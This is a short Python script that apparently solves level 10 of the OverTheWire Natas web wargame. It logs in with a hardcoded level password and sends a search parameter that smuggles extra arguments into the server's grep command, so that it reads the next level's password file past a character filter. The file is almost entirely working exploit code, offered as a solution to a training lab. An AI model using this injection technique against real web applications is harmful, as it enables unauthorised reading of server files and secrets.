import requests

url= 'http://natas10.natas.labs.overthewire.org/'

s= requests.Session()
s.auth= ('natas10', 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu')
r= s.get(url+'/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search')
print(r.text)
#Command Injection with filter. `. /etc/natas_webpass/natas11 #`